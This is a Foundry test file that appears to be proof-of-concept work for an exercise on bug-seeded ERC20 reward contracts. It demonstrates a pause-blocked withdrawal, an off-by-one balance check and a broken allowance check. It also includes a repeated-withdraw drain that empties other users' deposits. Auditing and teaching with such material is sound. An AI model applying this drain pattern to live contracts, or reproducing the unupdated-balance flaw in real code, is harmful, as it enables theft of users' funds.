// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.25;

import { Test } from "forge-std/src/Test.sol";
import { console2 } from "forge-std/src/console2.sol";
import { Token } from "test/Token.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Pausable.sol";
import { NotBasedToken, NotBasedRewarder } from "../src/BuggyERC201.sol";

contract BugPOC is Test {
    NotBasedToken public rewardToken;
    NotBasedRewarder public rewarder;
    Token public depositToken;
    address public owner;
    address public user1;
    address public user2;
    address public user3;
    address public user4;
    address public user5;
    address rewarderAddr;
    
    function setUp() public {
        // Initialize addresses
        owner = address(this);
        user1 = makeAddr("user1");
        user2 = makeAddr("user2");
        user3 = makeAddr("user3");
        user4 = makeAddr("user4");
        user5 = makeAddr("user5");
        rewarderAddr = makeAddr("rewarder");

        // Start prank as owner to set up the contracts
        vm.startPrank(owner);

        // Deploy deposit token
        depositToken = new Token();

        // Deploy reward token and mint to rewarder
        rewardToken = new NotBasedToken(rewarderAddr);

        // Deploy the rewarder contract
        rewarder = new NotBasedRewarder(
            IERC20(address(rewardToken)),
            IERC20(address(depositToken))
        );

        // Transfer deposit tokens to user1
        depositToken.transfer(user1, 100_000e18);
        depositToken.transfer(user2, 100_000e18);
        depositToken.transfer(user3, 100_000e18);
        depositToken.transfer(user4, 100_000e18);
        depositToken.transfer(user5, 100_000e18);
        vm.stopPrank();

        // Mint and transfer reward tokens to the rewarder
        vm.startPrank(rewarderAddr);
        rewardToken.transfer(address(rewarder), 100_000_000e18);
        vm.stopPrank();
    }

    function test_WithdrawFailWhenTokenPaused() public {
        uint256 depositAmount = 1_000e18;
        
        // user1 deposits
        vm.startPrank(user1);
        rewardToken.approve(address(rewarder), depositAmount + 100e18);
        depositToken.approve(address(rewarder), depositAmount + 100e18);
        rewarder.deposit(depositAmount);
        vm.stopPrank();

        // owner pause rewardToken
        vm.prank(owner);
        rewardToken.pause();
        
        // user1 tries to withdraw - should fail because token is paused
        skip(5_184_001); // 24 hr + 1 sec
        vm.prank(user1);
        vm.expectRevert(abi.encodeWithSignature("EnforcedPause()"));
        rewarder.withdraw(depositAmount - 100e18);
    }

    function test_WithdrawExactAmountFails() public {
        uint256 depositAmount = 1_000e18;
        
        // user1 deposits
        vm.startPrank(user1);
        depositToken.approve(address(rewarder), depositAmount + 100e18);
        rewardToken.approve(address(rewarder), depositAmount + 100e18);
        rewarder.deposit(depositAmount);
        vm.stopPrank();

        // Try to withdraw exact amount - should fail due to < instead of <= check
        skip(5_184_001); // 24 hr + 1 sec
        vm.prank(user1);
        vm.expectRevert("insufficient balance");
        rewarder.withdraw(depositAmount);
    }

    function test_MultipleWithdrawsAllowed() public {
        uint256 depositAmount = 10_000e18;
        uint256 user1DepositTokenBalanceBefore = depositToken.balanceOf(user1);
        uint256 user1RewardTokenBalanceBefore = rewardToken.balanceOf(user1);
        
        // other user deposits
        vm.startPrank(user2);
        depositToken.approve(address(rewarder), depositAmount + 100e18);
        rewardToken.approve(address(rewarder), depositAmount + 100e18);
        rewarder.deposit(depositAmount);
        vm.stopPrank();

        vm.startPrank(user3);
        depositToken.approve(address(rewarder), depositAmount + 100e18);
        rewardToken.approve(address(rewarder), depositAmount + 100e18);
        rewarder.deposit(depositAmount);
        vm.stopPrank();
        
        vm.startPrank(user4);
        depositToken.approve(address(rewarder), depositAmount + 100e18);
        rewardToken.approve(address(rewarder), depositAmount + 100e18);
        rewarder.deposit(depositAmount);
        vm.stopPrank();

        vm.startPrank(user5);
        depositToken.approve(address(rewarder), depositAmount + 100e18);
        rewardToken.approve(address(rewarder), depositAmount + 100e18);
        rewarder.deposit(depositAmount);
        vm.stopPrank();


        // user1 deposits
        vm.startPrank(user1);
        depositToken.approve(address(rewarder), depositAmount + 100e18);
        rewardToken.approve(address(rewarder), depositAmount + 100e18);
        rewarder.deposit(depositAmount);
        uint256 balance = rewardToken.balanceOf(user1);
        console2.log("Reward Token balance of User1: ", balance);

        // Can withdraw multiple times because internal balance is not updated
        skip(5_184_001); // 24 hr + 1 sec
        rewarder.withdraw(depositAmount - 10e18);
        balance = rewardToken.balanceOf(user1);
        console2.log("Reward Token balance of User1: ", balance);
        
        // Second withdraw should fail but doesn't because balance isn't updated
        rewarder.withdraw(depositAmount - 10e18);
        balance = rewardToken.balanceOf(user1);
        console2.log("Reward Token balance of User1 1st withdraw: ", balance);
        
        // At this point user has withdrawn their full balance but can still withdraw more
        rewarder.withdraw(depositAmount - 10e18);
        balance = rewardToken.balanceOf(user1);
        console2.log("Reward Token balance of User1 2nd withdraw: ", balance);
        rewarder.withdraw(depositAmount - 10e18);
        balance = rewardToken.balanceOf(user1);
        console2.log("Reward Token balance of User1 3rd withdraw: ", balance);
        rewarder.withdraw(depositAmount - 10e18);
        balance = rewardToken.balanceOf(user1);
        console2.log("Reward Token balance of User1 4th withdraw: ", balance);
        vm.stopPrank();

        // user2 tries to withdraw
        vm.prank(user2);
        vm.expectRevert(abi.encodeWithSignature("InsufficientBalance()"));
        rewarder.withdraw(depositAmount - 10e18);

        // user3 tries to withdraw
        vm.prank(user3);
        vm.expectRevert(abi.encodeWithSignature("InsufficientBalance()"));
        rewarder.withdraw(depositAmount - 10e18);
    }

    function test_DepositFailsDueToWrongAllowanceCheck() public {
        uint256 depositAmount = 10_000e18;
        vm.startPrank(user1);
        depositToken.approve(address(rewarder), (type(uint256).max - 1));
        vm.expectRevert("insufficient allowance");
        rewarder.deposit(depositAmount);
    }
}
